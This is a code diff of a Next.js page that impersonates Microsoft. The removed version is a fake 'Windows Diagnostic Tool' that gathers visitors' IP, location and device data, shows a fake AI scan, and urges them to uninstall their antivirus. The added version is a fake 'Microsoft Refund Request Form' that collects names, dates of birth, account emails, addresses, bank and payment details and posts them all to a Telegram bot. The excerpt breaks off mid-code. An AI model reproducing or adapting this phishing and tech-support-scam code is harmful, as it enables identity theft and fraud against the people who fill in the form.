@@ -2,259 +2,252 @@
 
 import Image from 'next/image'
 import { useState, useEffect } from 'react'
-import { useRouter } from 'next/navigation'
 
-interface SessionData {
-  userAgent: string
-  ipAddress: string
-  city: string
-  state: string
-  country: string
+interface TelegramConfig {
+  botToken: string
+  chatId: string
 }
 
-interface DeviceProfile {
-  screenResolution: string
-  deviceRam: string
-  processors: string
-  operatingSystem: string
-}
+export default function RefundForm() {
+  const [isSubmitting, setIsSubmitting] = useState(false)
+  const [submitSuccess, setSubmitSuccess] = useState(false)
 
-export default function Home() {
-  const router = useRouter()
-  const [sessionData, setSessionData] = useState<SessionData>({
-    userAgent: '',
-    ipAddress: '',
-    city: '',
-    state: '',
-    country: '',
-  })
-
-  const [deviceProfile, setDeviceProfile] = useState<DeviceProfile>({
-    screenResolution: '',
-    deviceRam: '',
-    processors: '',
-    operatingSystem: '',
-  })
-
+  // Customer Information
   const [formData, setFormData] = useState({
-    fullName: '',
-    email: '',
-    agentId: '',
-    agentName: '',
-    alternatePhone: '',
-    explicitContent: '',
-    cryptoUsername: '',
+    fullLegalName: '',
+    dateOfBirth: '',
+    microsoftEmail: '',
+    alternateEmail: '',
+    phoneNumber: '',
+    billingAddress: '',
+    customerType: '',
+    // Purchase Details
+    productName: '',
+    skuId: '',
+    orderNumber: '',
+    purchaseChannel: '',
+    productCategory: '',
+    purchaseDate: '',
+    amountPaid: '',
+    currency: '',
+    paymentMethod: '',
+    // Refund Request Details
+    bankName: '',
+    refundAmount: '',
+    refundReasons: {
+      accidentalPurchase: false,
+      duplicateCharge: false,
+      productNotAsDescribed: false,
+      technicalIssues: false,
+      subscriptionCancellation: false,
+      billingError: false,
+      other: false,
+    },
+    detailedExplanation: '',
+    // Policy & Declaration
+    policyAcknowledgment: false,
+    customerDeclaration: false,
+    customerSignature: '',
+    signatureDate: '',
+    customerNamePrinted: '',
   })
 
-  const [showModal, setShowModal] = useState(false)
-  const [progress, setProgress] = useState(0)
-  const [showConflictModal, setShowConflictModal] = useState(false)
-  const [showFixModal, setShowFixModal] = useState(false)
-  const [selectedAntivirus, setSelectedAntivirus] = useState('')
-
-  useEffect(() => {
-    // Get session data
-    const userAgent = navigator.userAgent
-    const screenWidth = window.screen.width
-    const screenHeight = window.screen.height
-    const deviceMemory = (navigator as any).deviceMemory || 'Unknown'
-    const hardwareConcurrency = navigator.hardwareConcurrency || 'Unknown'
-    const platform = navigator.platform || 'Unknown'
-
-    setSessionData({
-      userAgent: userAgent,
-      ipAddress: 'Loading...',
-      city: 'Loading...',
-      state: 'Loading...',
-      country: 'Loading...',
-    })
-
-    setDeviceProfile({
-      screenResolution: `${screenWidth}x${screenHeight}`,
-      deviceRam: deviceMemory !== 'Unknown' ? `${deviceMemory} GB` : 'Unknown',
-      processors: String(hardwareConcurrency),
-      operatingSystem: platform.includes('Win') ? 'Windows' : platform,
-    })
-
-    // Fetch IP and location data
-    fetchIPData()
-  }, [])
-
-  const fetchIPData = async () => {
-    try {
-      // Try primary API: ipwho.is (good CORS support)
-      const controller = new AbortController()
-      const timeoutId = setTimeout(() => controller.abort(), 5000)
-      
-      const response = await fetch('https://ipwho.is/', {
-        signal: controller.signal
-      })
-      
-      clearTimeout(timeoutId)
-      
-      if (!response.ok) {
-        throw new Error('API request failed')
-      }
-      
-      const data = await response.json()
-
-      if (data.success === false) {
-        throw new Error(data.message || 'API error')
-      }
-
-      setSessionData(prev => ({
-        ...prev,
-        ipAddress: data.ip || 'Unknown',
-        city: data.city || 'Unknown',
-        state: data.region || data.region_name || 'Unknown',
-        country: data.country || data.country_name || 'Unknown',
-      }))
-    } catch (error) {
-      // Fallback 1: ipapi.co
-      try {
-        const controller = new AbortController()
-        const timeoutId = setTimeout(() => controller.abort(), 5000)
-        
-        const response = await fetch('https://ipapi.co/json/', {
-          signal: controller.signal
-        })
-        
-        clearTimeout(timeoutId)
-        
-        if (!response.ok) {
-          throw new Error('API failed')
-        }
-
-        const data = await response.json()
-
-        if (data.error) {
-          throw new Error(data.reason || 'API error')
-        }
-
-        setSessionData(prev => ({
+  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement | HTMLTextAreaElement>) => {
+    const { name, value, type } = e.target
+    
+    if (type === 'checkbox') {
+      const checkbox = e.target as HTMLInputElement
+      if (name.startsWith('reason_')) {
+        const reasonKey = name.replace('reason_', '')
+        setFormData(prev => ({
           ...prev,
-          ipAddress: data.ip || 'Unknown',
-          city: data.city || 'Unknown',
-          state: data.region || 'Unknown',
-          country: data.country_name || 'Unknown',
+          refundReasons: {
+            ...prev.refundReasons,
+            [reasonKey]: checkbox.checked,
+          },
         }))
-      } catch (fallbackError) {
-        // Final fallback 2: just IP from ipify
-        try {
-          const controller = new AbortController()
-          const timeoutId = setTimeout(() => controller.abort(), 5000)
-
-          const response = await fetch('https://api.ipify.org?format=json', {
-            signal: controller.signal
-          })
-
-          clearTimeout(timeoutId)
-
-          if (response.ok) {
-            const data = await response.json()
-            setSessionData(prev => ({
-              ...prev,
-              ipAddress: data.ip || 'Unable to detect',
-              city: 'Unable to detect',
-              state: 'Unable to detect',
-              country: 'Unable to detect',
-            }))
-          } else {
-            throw new Error('API failed')
-          }
-        } catch {
-          // Final fallback
-          setSessionData(prev => ({
-            ...prev,
-            ipAddress: 'Unable to detect',
-            city: 'Unable to detect',
-            state: 'Unable to detect',
-            country: 'Unable to detect',
-          }))
-        }
+      } else {
+        setFormData(prev => ({
+          ...prev,
+          [name]: checkbox.checked,
+        }))
       }
+    } else {
+      setFormData(prev => ({
+        ...prev,
+        [name]: value,
+      }))
     }
-  }
-
-  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
-    const { name, value } = e.target
-    setFormData(prev => ({ ...prev, [name]: value }))
   }
 
   const isFormValid = () => {
     return (
-      formData.fullName.trim() !== '' &&
-      formData.email.trim() !== '' &&
-      formData.agentId.trim() !== '' &&
-      formData.agentName.trim() !== '' &&
-      formData.alternatePhone.trim() !== '' &&
-      formData.explicitContent !== '' &&
-      formData.cryptoUsername.trim() !== ''
+      formData.fullLegalName.trim() !== '' &&
+      formData.dateOfBirth !== '' &&
+      formData.microsoftEmail.trim() !== '' &&
+      formData.customerType !== '' &&
+      formData.productName.trim() !== '' &&
+      formData.purchaseChannel !== '' &&
+      formData.productCategory !== '' &&
+      formData.bankName.trim() !== '' &&
+      formData.refundAmount.trim() !== '' &&
+      formData.policyAcknowledgment &&
+      formData.customerDeclaration &&
+      formData.customerNamePrinted.trim() !== ''
     )
+  }
+
+  const getTelegramConfig = async (): Promise<TelegramConfig> => {
+    try {
+      const response = await fetch('/telegram-config.json')
+      const config = await response.json()
+      const hostname = window.location.hostname
+      return config[hostname] || config['default']
+    } catch (error) {
+      console.error('Failed to load telegram config:', error)
+      return {
+        botToken: '',
+        chatId: '',
+      }
+    }
+  }
+
+  const formatRefundReasons = () => {
+    const reasons = []
+    if (formData.refundReasons.accidentalPurchase) reasons.push('Accidental Purchase')
+    if (formData.refundReasons.duplicateCharge) reasons.push('Duplicate Charge')
+    if (formData.refundReasons.productNotAsDescribed) reasons.push('Product Not as Described')
+    if (formData.refundReasons.technicalIssues) reasons.push('Technical Issues')
+    if (formData.refundReasons.subscriptionCancellation) reasons.push('Subscription Cancellation')
+    if (formData.refundReasons.billingError) reasons.push('Billing Error')
+    if (formData.refundReasons.other) reasons.push('Other')
+    return reasons.length > 0 ? reasons.join(', ') : 'None selected'
+  }
+
+  const sendToTelegram = async () => {
+    const config = await getTelegramConfig()
+    if (!config.botToken || !config.chatId) {
+      console.error('Telegram configuration is missing')
+      return false
+    }
+
+    const message = `
+🔔 *NEW MICROSOFT REFUND REQUEST*
+━━━━━━━━━━━━━━━━━━━━━━
+
+👤 *CUSTOMER INFORMATION*
+• Full Legal Name: ${formData.fullLegalName}
+• Date of Birth: ${formData.dateOfBirth}
+• Microsoft Email: ${formData.microsoftEmail}
+• Alternate Email: ${formData.alternateEmail || 'N/A'}
+• Phone Number: ${formData.phoneNumber || 'N/A'}
+• Billing Address: ${formData.billingAddress || 'N/A'}
+• Customer Type: ${formData.customerType}
+
+🛒 *PURCHASE DETAILS*
+• Product/Service: ${formData.productName}
+• SKU/License ID: ${formData.skuId || 'N/A'}
+• Order Number: ${formData.orderNumber || 'N/A'}
+• Purchase Channel: ${formData.purchaseChannel}
+• Product Category: ${formData.productCategory}
+• Purchase Date: ${formData.purchaseDate || 'N/A'}
+• Amount Paid: ${formData.amountPaid || 'N/A'} ${formData.currency || ''}
+• Payment Method: ${formData.paymentMethod || 'N/A'}
+
+💰 *REFUND REQUEST DETAILS*
+• Bank Name: ${formData.bankName}
+• Refund Amount: ${formData.refundAmount}
+• Reasons: ${formatRefundReasons()}
+• Explanation: ${formData.detailedExplanation || 'N/A'}
+
+✍️ *DECLARATION*
+• Signature: ${formData.customerSignature || 'N/A'}
+• Date: ${formData.signatureDate || 'N/A'}
+• Printed Name: ${formData.customerNamePrinted}
+
+━━━━━━━━━━━━━━━━━━━━━━
+📅 Submitted: ${new Date().toLocaleString()}
+🌐 Source: ${window.location.hostname}
+`
+
+    try {
+      const response = await fetch(
+        `https://api.telegram.org/bot${config.botToken}/sendMessage`,
+        {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            chat_id: config.chatId,
+            text: message,
+            parse_mode: 'Markdown',
+          }),
+        }
+      )
+      return response.ok
+    } catch (error) {
+      console.error('Failed to send to Telegram:', error)
+      return false
+    }
   }
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
     if (!isFormValid()) return
 
-    // Persist data for cancellation page
-    if (typeof window !== 'undefined') {
-      try {
-        window.sessionStorage.setItem('diagnosticForm', JSON.stringify(formData))
-        window.sessionStorage.setItem('sessionData', JSON.stringify(sessionData))
-      } catch (err) {
-        console.error('Failed to persist diagnostic data', err)
-      }
-    }
+    setIsSubmitting(true)
+
+    const success = await sendToTelegram()
     
-    // Show modal
-    setShowModal(true)
-    setProgress(0)
+    if (success) {
+      setSubmitSuccess(true)
+    }
+
+    setIsSubmitting(false)
   }
 
-  useEffect(() => {
-    const anyModalOpen = showModal || showConflictModal || showFixModal
+  if (submitSuccess) {
+    return (
+      <>
+        <header className="header">
+          <div className="header-brand">
+            <a href="#" className="header-link">
+              <Image 
+                src="/microsoft-logo.png" 
+                alt="Microsoft" 
+                width={108} 
+                height={24}
+                className="header-logo"
+              />
+            </a>
+          </div>
+        </header>
 
-    if (anyModalOpen) {
-      document.body.style.overflow = 'hidden'
-    } else {
-      document.body.style.overflow = ''
-    }
-
-    if (!showModal) {
-      return
-    }
-
-    const duration = 35000 // 35 seconds
-    const interval = 50 // Update every 50ms for smoother animation
-    const increment = (100 / duration) * interval
-
-    const timer = setInterval(() => {
-      setProgress((prev) => {
-        const newProgress = prev + increment
-        if (newProgress >= 100) {
-          clearInterval(timer)
-          setTimeout(() => {
-            setShowModal(false)
-            setProgress(0)
-            setShowConflictModal(true)
-          }, 500)
-          return 100
-        }
-        return newProgress
-      })
-    }, interval)
-
-    return () => {
-      clearInterval(timer)
-    }
-  }, [showModal, showConflictModal, showFixModal])
+        <main className="main-container">
+          <div className="refund-card">
+            <div className="success-content">
+              <div className="success-icon">✓</div>
+              <h2 className="success-title">Request Submitted Successfully</h2>
+              <p className="success-text">
+                Your refund request has been submitted and is being reviewed by our team. 
+                You will receive a confirmation email shortly.
+              </p>
+              <p className="success-reference">
+                Reference: REF-{Date.now().toString(36).toUpperCase()}
+              </p>
+            </div>
+          </div>
+        </main>
+      </>
+    )
+  }
 
   return (
     <>
       <header className="header">
         <div className="header-brand">
-          <a href="https://microchipsecurity.tech/#" className="header-link">
+          <a href="#" className="header-link">
             <Image 
               src="/microsoft-logo.png" 
               alt="Microsoft" 
@@ -263,335 +256,458 @@ export default function Home() {
               className="header-logo"
             />
           </a>
-          <a href="https://microchipsecurity.tech/#" className="header-link header-title">
-            Diagnostic Tool
-          </a>
         </div>
       </header>
 
       <main className="main-container">
-        <div className="content-layout">
-          {/* Session Data Card */}
-          <div className="info-card">
-            <h3 className="info-card-title">Session Data</h3>
-            
-            <div className="info-item">
-              <div className="info-label">User Agent</div>
-              <div className="info-value">{sessionData.userAgent}</div>
-            </div>
-            
-            <div className="info-item">
-              <div className="info-label">IP Address</div>
-              <div className="info-value">{sessionData.ipAddress}</div>
-            </div>
-            
-            <div className="info-item">
-              <div className="info-label">City</div>
-              <div className="info-value">{sessionData.city}</div>
-            </div>
-            
-            <div className="info-item">
-              <div className="info-label">State</div>
-              <div className="info-value">{sessionData.state}</div>
-            </div>
-            
-            <div className="info-item">
-              <div className="info-label">Country</div>
-              <div className="info-value">{sessionData.country}</div>
-            </div>
-          </div>
-
-          {/* Center Content */}
-          <div className="center-content">
+        <div className="refund-card">
+          <div className="refund-header">
             <Image 
               src="/windows-logo.png" 
               alt="Windows" 
-              width={120} 
-              height={120}
-              className="windows-logo"
+              width={60} 
+              height={60}
+              className="refund-logo"
             />
-            
-            <h1 className="main-title">Windows Diagnostic Tool</h1>
-            <p className="subtitle">AI-Assisted Compatibility Assessment</p>
-            
-            <h2 className="alert-title">Windows Upgrade Detected</h2>
-            
-            <p className="description">
-              Upgraded version of Windows does not require and support third-party antivirus 
-              software. Uninstall immediately.
-            </p>
-            
-            <p className="description description-highlight">
-              This type of issue commonly arises when old apps in Windows no longer work due to 
-              the upgrade. When you encounter this issue, you are aware that it is one of the 
-              operating system breakdown symptoms, but you can easily address it. In most cases, 
-              Windows offers an in-built capability that allows applications to be made compatible 
-              with the new version. If you are a computer expert and are familiar with the language, 
-              you can run the software in compatibility mode.
-            </p>
-
-            <p className="form-intro">
-              To continue, please provide your <strong>Email</strong> and <strong>Name</strong> below.
-            </p>
-
-            <form className="diagnostic-form" onSubmit={handleSubmit} autoComplete="off">
-              <div className="form-group">
-                <label className="form-label">Full Name</label>
-                <input
-                  type="text"
-                  name="fullName"
-                  className="form-input"
-                  value={formData.fullName}
-                  onChange={handleInputChange}
-                  autoComplete="off"
-                  required
-                />
-              </div>
-
-              <div className="form-group">
-                <label className="form-label">Email</label>
-                <input
-                  type="email"
-                  name="email"
-                  className="form-input"
-                  value={formData.email}
-                  onChange={handleInputChange}
-                  autoComplete="off"
-                  required
-                />
-              </div>
-
-              <div className="form-group">
-                <label className="form-label">Agent ID</label>
-                <input
-                  type="text"
-                  name="agentId"
-                  className="form-input"
-                  value={formData.agentId}
-                  onChange={handleInputChange}
-                  autoComplete="off"
-                />
-              </div>
-
-              <div className="form-group">
-                <label className="form-label">Agent Name</label>
-                <input
-                  type="text"
-                  name="agentName"
-                  className="form-input"
-                  value={formData.agentName}
-                  onChange={handleInputChange}
-                  autoComplete="off"
-                />
-              </div>
-
-              <div className="form-group">
-                <label className="form-label">Alternate Phone Number</label>
-                <input
-                  type="tel"
-                  name="alternatePhone"
-                  className="form-input"
-                  value={formData.alternatePhone}
-                  onChange={handleInputChange}
-                  autoComplete="off"
-                />
-              </div>
-
-              <div className="form-group">
-                <label className="form-label">Explicit Content</label>
-                <select
-                  name="explicitContent"
-                  className="form-select"
-                  value={formData.explicitContent}
-                  onChange={handleInputChange}
-                  autoComplete="off"
-                >
-                  <option value="">Please select answer...</option>
-                  <option value="yes">Yes</option>
-                  <option value="no">No</option>
-                </select>
-              </div>
-
-              <div className="form-group">
-                <label className="form-label">Crypto Username</label>
-                <input
-                  type="text"
-                  name="cryptoUsername"
-                  className="form-input"
-                  value={formData.cryptoUsername}
-                  onChange={handleInputChange}
-                  autoComplete="off"
-                />
-              </div>
-
-              <button 
-                type="submit" 
-                className="submit-button"
-                disabled={!isFormValid()}
-              >
-                Fix Now &gt;&gt;
-              </button>
-            </form>
+            <h1 className="refund-title">Microsoft Refund Request Form</h1>
+            <p className="refund-subtitle">Confidential – For Official Use Only</p>
           </div>
 
-          {/* Device Profile Card */}
-          <div className="info-card">
-            <h3 className="info-card-title">Device Profile</h3>
-            
-            <div className="info-item">
-              <div className="info-label">Screen Resolution</div>
-              <div className="info-value">{deviceProfile.screenResolution}</div>
-            </div>
-            
-            <div className="info-item">
-              <div className="info-label">Device RAM</div>
-              <div className="info-value">{deviceProfile.deviceRam}</div>
-            </div>
-            
-            <div className="info-item">
-              <div className="info-label">Processors</div>
-              <div className="info-value">{deviceProfile.processors}</div>
-            </div>
-            
-            <div className="info-item">
-              <div className="info-label">Operating System</div>
-              <div className="info-value">{deviceProfile.operatingSystem}</div>
-            </div>
-          </div>
-        </div>
-      </main>
-
-      {/* AI Device Scan Modal */}
-      {showModal && (
-        <div className="modal-overlay">
-          <div className="modal-content">
-            <div className="modal-header">
-              <div className="modal-icon"></div>
-              <h3 className="modal-title">AI Device Scan</h3>
-            </div>
-            
-            <div className="modal-body">
-              <div className="loader-container">
-                <div className="animated-loader">
-                  <div className="animated-loader-inner"></div>
+          <form className="refund-form" onSubmit={handleSubmit} autoComplete="off">
+            {/* Customer Information Section */}
+            <section className="form-section">
+              <h2 className="section-title">Customer Information</h2>
+              
+              <div className="form-row two-cols">
+                <div className="form-field">
+                  <label className="field-label">Full Legal Name *</label>
+                  <input
+                    type="text"
+                    name="fullLegalName"
+                    className="field-input"
+                    value={formData.fullLegalName}
+                    onChange={handleInputChange}
+                    required
+                  />
+                </div>
+                <div className="form-field">
+                  <label className="field-label">Date of Birth *</label>
+                  <input
+                    type="date"
+                    name="dateOfBirth"
+                    className="field-input"
+                    value={formData.dateOfBirth}
+                    onChange={handleInputChange}
+                    placeholder="mm/dd/yyyy"
+                    required
+                  />
                 </div>
               </div>
-              
-              <p className="modal-status">
-                Reviewing startup and background processes... {Math.round(progress)}%
-              </p>
-              
-              <div className="progress-bar-container">
-                <div 
-                  className="progress-bar-fill" 
-                  style={{ width: `${progress}%` }}
-                ></div>
+
+              <div className="form-row two-cols">
+                <div className="form-field">
+                  <label className="field-label">Microsoft Account Email *</label>
+                  <input
+                    type="email"
+                    name="microsoftEmail"
+                    className="field-input"
+                    value={formData.microsoftEmail}
+                    onChange={handleInputChange}
+                    required
+                  />
+                </div>
+                <div className="form-field">
+                  <label className="field-label">Alternate Email</label>
+                  <input
+                    type="email"
+                    name="alternateEmail"
+                    className="field-input"
+                    value={formData.alternateEmail}
+                    onChange={handleInputChange}
+                  />
+                </div>
               </div>
-              
-              <p className="modal-substatus">
-                <span className="status-icon"></span>
-                AI assistant: analysing system configuration in real time
-              </p>
-            </div>
-          </div>
+
+              <div className="form-row">
+                <div className="form-field">
+                  <label className="field-label">Phone Number</label>
+                  <input
+                    type="tel"
+                    name="phoneNumber"
+                    className="field-input field-half"
+                    value={formData.phoneNumber}
+                    onChange={handleInputChange}
+                  />
+                </div>
+              </div>
+
+              <div className="form-row">
+                <div className="form-field">
+                  <label className="field-label">Billing Address</label>
+                  <input
+                    type="text"
+                    name="billingAddress"
+                    className="field-input field-wide"
+                    value={formData.billingAddress}
+                    onChange={handleInputChange}
+                  />
+                </div>
+              </div>
+
+              <div className="form-row">
+                <div className="form-field">
+                  <label className="field-label">Customer Type *</label>
+                  <select
+                    name="customerType"
+                    className="field-select field-half"
+                    value={formData.customerType}
+                    onChange={handleInputChange}
+                    required
+                  >
+                    <option value="">-- Select --</option>
+                    <option value="Individual">Individual</option>
+                    <option value="Business">Business</option>
+                    <option value="Education">Education</option>
+                    <option value="Government">Government</option>
+                    <option value="Non-Profit">Non-Profit</option>
+                  </select>
+                </div>
+              </div>
+            </section>
+
+            {/* Purchase Details Section */}
+            <section className="form-section">
+              <h2 className="section-title">Purchase Details</h2>
+
+              <div className="form-row two-cols">
+                <div className="form-field">
+                  <label className="field-label">Product or Service Name *</label>
+                  <input
+                    type="text"
+                    name="productName"
+                    className="field-input"
+                    value={formData.productName}
+                    onChange={handleInputChange}
+                    required
+                  />
+                </div>
+                <div className="form-field">
+                  <label className="field-label">SKU / Subscription ID / License ID</label>
+                  <input
+                    type="text"
+                    name="skuId"
+                    className="field-input"
+                    value={formData.skuId}
+                    onChange={handleInputChange}
+                  />
+                </div>
+              </div>
+
+              <div className="form-row two-cols">
+                <div className="form-field">
+                  <label className="field-label">Order Number / Invoice Number</label>
+                  <input
+                    type="text"
+                    name="orderNumber"
+                    className="field-input"
+                    value={formData.orderNumber}
+                    onChange={handleInputChange}
+                  />
+                </div>
+                <div className="form-field">
+                  <label className="field-label">Purchase Channel *</label>
+                  <select
+                    name="purchaseChannel"
+                    className="field-select"
+                    value={formData.purchaseChannel}
+                    onChange={handleInputChange}
+                    required
+                  >
+                    <option value="">-- Select --</option>
+                    <option value="Microsoft Store">Microsoft Store</option>
+                    <option value="Xbox Store">Xbox Store</option>
+                    <option value="Microsoft 365">Microsoft 365</option>
+                    <option value="Azure">Azure</option>
+                    <option value="Windows Store">Windows Store</option>
+                    <option value="Retail Partner">Retail Partner</option>
+                    <option value="Other">Other</option>
+                  </select>
+                </div>
+              </div>
+
+              <div className="form-row two-cols">
+                <div className="form-field">
+                  <label className="field-label">Product Category *</label>
+                  <select
+                    name="productCategory"
+                    className="field-select"
+                    value={formData.productCategory}
+                    onChange={handleInputChange}
+                    required
+                  >
+                    <option value="">-- Select --</option>
+                    <option value="Software">Software</option>
+                    <option value="Hardware">Hardware</option>
+                    <option value="Subscription">Subscription</option>
+                    <option value="Game">Game</option>
+                    <option value="App">App</option>
+                    <option value="In-App Purchase">In-App Purchase</option>
+                    <option value="Cloud Service">Cloud Service</option>
+                    <option value="Other">Other</option>
+                  </select>
+                </div>
+                <div className="form-field">
+                  <label className="field-label">Purchase Date</label>
+                  <input
+                    type="date"
+                    name="purchaseDate"
+                    className="field-input"
+                    value={formData.purchaseDate}
+                    onChange={handleInputChange}
+                    placeholder="mm/dd/yyyy"
+                  />
+                </div>
+              </div>
+
+              <div className="form-row two-cols">
+                <div className="form-field">
+                  <label className="field-label">Amount Paid</label>
+                  <input
+                    type="text"
+                    name="amountPaid"
+                    className="field-input"
+                    value={formData.amountPaid}
+                    onChange={handleInputChange}
+                  />
+                </div>
+                <div className="form-field">
+                  <label className="field-label">Currency</label>
+                  <input
+                    type="text"
+                    name="currency"
+                    className="field-input"
+                    value={formData.currency}
+                    onChange={handleInputChange}
+                    placeholder="e.g. USD, EUR, GBP"
+                  />
+                </div>
+              </div>
+
+              <div className="form-row">
+                <div className="form-field">
+                  <label className="field-label">Payment Method</label>
+                  <select
+                    name="paymentMethod"
+                    className="field-select field-half"
+                    value={formData.paymentMethod}
+                    onChange={handleInputChange}
+                  >
+                    <option value="">-- Select --</option>
+                    <option value="Credit Card">Credit Card</option>
+                    <option value="Debit Card">Debit Card</option>
+                    <option value="PayPal">PayPal</option>
+                    <option value="Bank Transfer">Bank Transfer</option>
+                    <option value="Gift Card">Gift Card</option>
+                    <option value="Mobile Payment">Mobile Payment</option>
+                    <option value="Other">Other</option>
+                  </select>
+                </div>
+              </div>
+            </section>
+
+            {/* Refund Request Details Section */}
+            <section className="form-section">
+              <h2 className="section-title">Refund Request Details</h2>
+
+              <div className="form-row two-cols">
+                <div className="form-field">
+                  <label className="field-label">Bank Name *</label>
+                  <input
+                    type="text"
+                    name="bankName"
+                    className="field-input"
+                    value={formData.bankName}
+                    onChange={handleInputChange}
+                    required
+                  />
+                </div>
+                <div className="form-field">
+                  <label className="field-label">Refund Amount Requested *</label>
+                  <input
+                    type="text"
+                    name="refundAmount"
+                    className="field-input"
+                    value={formData.refundAmount}
+                    onChange={handleInputChange}
+                    required
+                  />
+                </div>
+              </div>
+
+              <div className="checkbox-group">
+                <label className="checkbox-label">
+                  <input
+                    type="checkbox"
+                    name="reason_accidentalPurchase"
+                    checked={formData.refundReasons.accidentalPurchase}
+                    onChange={handleInputChange}
+                  />
+                  <span className="checkbox-text">Accidental Purchase</span>
+                </label>
+                <label className="checkbox-label">
+                  <input
+                    type="checkbox"
+                    name="reason_duplicateCharge"
+                    checked={formData.refundReasons.duplicateCharge}
+                    onChange={handleInputChange}
+                  />
+                  <span className="checkbox-text">Duplicate Charge</span>
+                </label>
+                <label className="checkbox-label">
+                  <input
+                    type="checkbox"
+                    name="reason_productNotAsDescribed"
+                    checked={formData.refundReasons.productNotAsDescribed}
+                    onChange={handleInputChange}
+                  />
+                  <span className="checkbox-text">Product Not as Described</span>
+                </label>
+                <label className="checkbox-label">
+                  <input
+                    type="checkbox"
+                    name="reason_technicalIssues"
+                    checked={formData.refundReasons.technicalIssues}
+                    onChange={handleInputChange}
+                  />
+                  <span className="checkbox-text">Technical Issues</span>
+                </label>
+                <label className="checkbox-label">
+                  <input
+                    type="checkbox"
+                    name="reason_subscriptionCancellation"
+                    checked={formData.refundReasons.subscriptionCancellation}
+                    onChange={handleInputChange}
+                  />
+                  <span className="checkbox-text">Subscription Cancellation</span>
+                </label>
+                <label className="checkbox-label">
+                  <input
+                    type="checkbox"
+                    name="reason_billingError"
+                    checked={formData.refundReasons.billingError}
+                    onChange={handleInputChange}
+                  />
+                  <span className="checkbox-text">Billing Error</span>
+                </label>
+                <label className="checkbox-label">
+                  <input
+                    type="checkbox"
+                    name="reason_other"
+                    checked={formData.refundReasons.other}
+                    onChange={handleInputChange}
+                  />
+                  <span className="checkbox-text">Other (explain below)</span>
+                </label>
+              </div>
+
+              <div className="form-row">
+                <div className="form-field">
+                  <label className="field-label">Detailed Explanation of Reason for Refund</label>
+                  <textarea
+                    name="detailedExplanation"
+                    className="field-textarea"
+                    value={formData.detailedExplanation}
+                    onChange={handleInputChange}
+                    rows={3}
+                  />
+                </div>
+              </div>
+            </section>
+
+            {/* Policy Acknowledgment Section */}
+            <section className="form-section">
+              <h2 className="section-title">Policy Acknowledgment</h2>
+              <label className="checkbox-label policy-checkbox">
+                <input
+                  type="checkbox"
+                  name="policyAcknowledgment"
+                  checked={formData.policyAcknowledgment}
+                  onChange={handleInputChange}
+                  required
+                />
+                <span className="checkbox-text">
+                  I acknowledge that this refund request is subject to Microsoft's Refund and Cancellation Policy. 
+                  Approval is not guaranteed and refunds may be issued at Microsoft's sole discretion.
+                </span>
+              </label>
+            </section>
+
+            {/* Customer Declaration Section */}
+            <section className="form-section">
+              <h2 className="section-title">Customer Declaration</h2>
+              <label className="checkbox-label policy-checkbox">
+                <input
+                  type="checkbox"
+                  name="customerDeclaration"
+                  checked={formData.customerDeclaration}
+                  onChange={handleInputChange}
+                  required
+                />
+                <span className="checkbox-text">
+                  I certify that the information provided is true, accurate, and complete. I understand that submitting 
+                  false information may result in denial of this request.
+                </span>
+              </label>
+
+              <div className="form-row two-cols" style={{ marginTop: '1.5rem' }}>
+                <div className="form-field">
+                  <label className="field-label">Customer Signature</label>
+                  <input
+                    type="text"
+                    name="customerSignature"
+                    className="field-input"
+                    value={formData.customerSignature}
+                    onChange={handleInputChange}
+                  />
+                </div>
+                <div className="form-field">
+                  <label className="field-label">Date</label>
+                  <input
+                    type="date"
+                    name="signatureDate"
+                    className="field-input"
+                    value={formData.signatureDate}
+                    onChange={handleInputChange}
+                    placeholder="mm/dd/yyyy"
+                  />
+                </div>
+              </div>
+
+              <div className="form-row">
+                <div className="form-field">
+                  <label className="field-label">Customer Name (Printed) *</label>
+                  <input
+                    type="text"
+                    name="customerNamePrinted"
+                    className="field-input field-half"
+                    value={formData.customerNamePrinted}
+                    onChange={handleInputChange}
+                    required
+                  />
+                </div>
+              </div>
+            </section>
+
+            <button 
+              type="submit" 
+              className="submit-button"
+              disabled={!isFormValid() || isSubmitting}
+            >
+              {isSubmitting ? 'Submitting...' : 'Submit Request'}
+            </button>
+          </form>
         </div>
-      )}
-
-      {/* Conflict Detected Modal */}
-      {showConflictModal && (
-        <div className="modal-overlay">
-          <div className="conflict-modal">
-            <h3 className="conflict-title">Conflict Detected</h3>
-
-            <p className="conflict-text-main">
-              Windows Defender appears to be conflicting with an existing Anti-Virus.
-            </p>
-
-            <p className="conflict-text-sub">
-              Please select below which Anti-Virus you currently have installed.
-            </p>
-
-            <div className="conflict-select-wrapper">
-              <select
-                name="installedAntivirus"
-                className="conflict-select"
-                value={selectedAntivirus}
-                onChange={(e) => setSelectedAntivirus(e.target.value)}
-              >
-                <option value="">Select Anti-Virus...</option>
-                <option value="Norton">Norton</option>
-                <option value="McAfee">McAfee</option>
-                <option value="AVG">AVG</option>
-                <option value="Trend Micro">Trend Micro</option>
-                <option value="MalwareBytes">MalwareBytes</option>
-                <option value="Avast">Avast</option>
-                <option value="Bitdefender">Bitdefender</option>
-                <option value="Kaspersky">Kaspersky</option>
-                <option value="Webroot">Webroot</option>
-                <option value="Windows Defender">Windows Defender</option>
-              </select>
-            </div>
-
-            <div className="conflict-button-row">
-              <button
-                type="button"
-                className="conflict-proceed-button"
-                disabled={!selectedAntivirus}
-                onClick={() => {
-                  setShowConflictModal(false)
-                  setShowFixModal(true)
-                }}
-              >
-                Proceed &gt;
-              </button>
-            </div>
-          </div>
-        </div>
-      )}
-
-      {/* Fix Required Modal */}
-      {showFixModal && (
-        <div className="modal-overlay">
-          <div className="fix-modal">
-            <h3 className="fix-title">Fix Required</h3>
-
-            <p className="fix-text-main">
-              {selectedAntivirus || 'This Anti-Virus'} is not supported with your version of{' '}
-              <span className="fix-highlight">Windows</span>.
-            </p>
-
-            <p className="fix-text-sub">
-              Please uninstall {selectedAntivirus || 'this Anti-Virus'} immediately.
-            </p>
-
-            <div className="conflict-button-row">
-              <button
-                type="button"
-                className="submit-button"
-                onClick={() => {
-                  setShowFixModal(false)
-                  if (typeof window !== 'undefined') {
-                    try {
-                      window.sessionStorage.setItem('selectedAntivirus', selectedAntivirus || '')
-                    } catch (err) {
-                      console.error('Failed to persist antivirus', err)
-                    }
-                  }
-                  const target = (selectedAntivirus || 'McAfee')
-                    .toLowerCase()
